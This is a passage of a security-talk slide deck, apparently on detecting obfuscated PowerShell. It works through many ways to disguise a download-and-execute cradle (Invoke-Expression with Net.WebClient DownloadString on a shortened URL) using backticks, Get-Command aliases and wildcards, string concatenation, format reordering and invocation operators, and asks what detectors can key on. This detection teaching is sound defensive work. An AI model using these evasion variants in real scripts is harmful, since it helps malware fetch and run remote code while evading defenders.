'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Did I mention Get-Command also has aliases?
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
•
& (GCM *w-O*)
.
•
.   (GCM *w-O*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Did I mention Get-Command also has MORE aliases?
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
•
& (GCM *w-O*)
.
•
.   (GCM *w-O*)
•
& (COMMAND *w-O*)
.
•
.   (COMMAND *w-O*)
COMMAND works because PowerShell 
auto prepends "Get-" to any 
command, so COMMAND resolves to 
Get-Command.
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object | Get-Command | GCM | Command
• Get-Command  Can also be set with a string variable
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
• $var1="New"; $var2="-Object"; $var3=$var1+$var2; & (GCM $var3)
•
& (GCM *w-O*)
.
•
.   (GCM *w-O*)
•
& (COMMAND *w-O*)
.
•
.   (COMMAND *w-O*)
Obfuscating the Cradle
• Invoke-Expression ((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T").   "`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t'))
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object | Get-Command | GCM | Command
• Get-Command  Can also be set with a string variable
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
• $var1="New"; $var2="-Object"; $var3=$var1+$var2; & (GCM $var3)
•
& (GCM *w-O*)
.
•
.   (GCM *w-O*)
•
& (COMMAND *w-O*)
.
•
.   (COMMAND *w-O*)
PowerShell 1.0 ways of calling Get-Command:
1.
$ExecutionContext.InvokeCommand.GetCommand("New-Ob"+"ject", [System.Management.Automation.CommandTypes]::Cmdlet)
2.
$ExecutionContext.InvokeCommand.GetCmdlet("New-Ob"+"ject")
3.
$ExecutionContext.InvokeCommand.GetCommands("*w-o*",[System.Management.Automation.CommandTypes]::Cmdlet,1)
4.
$ExecutionContext.InvokeCommand.GetCmdlets("*w-o*") 
5.
$ExecutionContext.InvokeCommand.GetCommand($ExecutionContext.InvokeCommand.GetCommandName("*w-o*",1,1), 
[System.Management.Automation.CommandTypes]::Cmdlet)
6.
$ExecutionContext.InvokeCommand.GetCmdlet($ExecutionContext.InvokeCommand.GetCommandName("*w-o*",1,1))
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object | Get-Command | GCM | Command
• Get-Command  Can also be set with a string variable
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
• $var1="New"; $var2="-Object"; $var3=$var1+$var2; & (GCM $var3)
•
& (GCM *w-O*)
.
•
.   (GCM *w-O*)
•
& (COMMAND *w-O*)
.
•
.   (COMMAND *w-O*)
NOTE: Get-Command's 
cousin is just as useful…
Get-Alias / GAL / Alias
Obfuscating the Cradle
• Invoke-Expression (& (GCM *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object | Get-Command | GCM | Command | Get-Alias | GAL | Alias
• Get-Command  Can also be set with a string variable
• & (Get-Command *w-O*)
• .   (Get-Command *w-O*)
• $var1="New"; $var2="-Object"; $var3=$var1+$var2; & (GCM $var3)
•
& (GCM *w-O*)
.
•
.   (GCM *w-O*)
•
& (COMMAND *w-O*)
.
•
.   (COMMAND *w-O*)
Obfuscating the Cradle
• Invoke-Expression (& (GCM *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object | Get-Command | GCM | Command | Get-Alias | GAL | Alias
• Given wildcards it's infeasible to find all possible ways for Get-
Command/GCM/Command/Get-Alias/GAL/Alias to find and execute New-Object, so potential 
for FPs with this approach.
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• `N`e`w`-`O`b`j`e`c`T | `G`e`T`-`C`o`m`m`a`N`d | `G`C`M | `C`O`M`M`A`N`D | G`e`T`-`A`l`i`A`s | 
`G`A`L | `A`l`i`A`s
• Ticks also work on PowerShell cmdlets…
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• `N`e`w`-`O`b`j`e`c`T | `G`e`T`-`C`o`m`m`a`N`d | `G`C`M | `C`O`M`M`A`N`D | G`e`T`-`A`l`i`A`s | 
`G`A`L | `A`l`i`A`s
• Ticks also work on PowerShell cmdlets…and so do invocation operators.
• & ('Ne'+'w-Obj'+'ect')         & ("{1}{0}{2}" -f 'w-Ob','Ne','ject')
• .   ('Ne'+'w-Obj'+'ect')         & ("{1}{0}{2}" -f 'w-Ob','Ne','ject')
Concatenated
Reordered
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• `N`e`w`-`O`b`j`e`c`T | `G`e`T`-`C`o`m`m`a`N`d | `G`C`M | `C`O`M`M`A`N`D | G`e`T`-`A`l`i`A`s | 
`G`A`L | `A`l`i`A`s
• Ticks also work on PowerShell cmdlets…and so do invocation operators.
• Once again, Regex all the things or give up on this indicator
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
1.
Aliases: Invoke-Expression / IEX
1.
Invoke-Expression "Write-Host IEX Example -ForegroundColor Green"
2.
IEX "Write-Host IEX Example -ForegroundColor Green"
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
1.
Aliases: Invoke-Expression / IEX
2.
Order
1.
IEX "Write-Host IEX Example -ForegroundColor Green"
2.
"Write-Host IEX Example -ForegroundColor Green" | IEX
Obfuscating the Cradle
.
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
1.
Aliases: Invoke-Expression / IEX
2.
Order
3.
Ticks
1.
`I`E`X
2.
`I`N`v`o`k`e`-`E`x`p`R`e`s`s`i`o`N
Obfuscating the Cradle
.
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
1.
Aliases: Invoke-Expression / IEX
2.
Order
3.
Ticks
4.
Invocation operators
1.
& ('I'+'EX')
2.
.   ('{1}{0}' -f 'EX','I')
Obfuscating the Cradle
.
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
1.
Aliases: Invoke-Expression / IEX
2.
Order
3.
Ticks
4.
Invocation operators
1.
& ('I'+'EX')
2.
.   ('{1}{0}' -f 'EX','I')
Obfuscating the Cradle
.
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• What's potentially problematic about Invoke-Expression?
1.
Aliases: Invoke-Expression / IEX
2.
Order
3.
Ticks
4.
Invocation operators
5.
Invoke-Expression vs Invoke-Command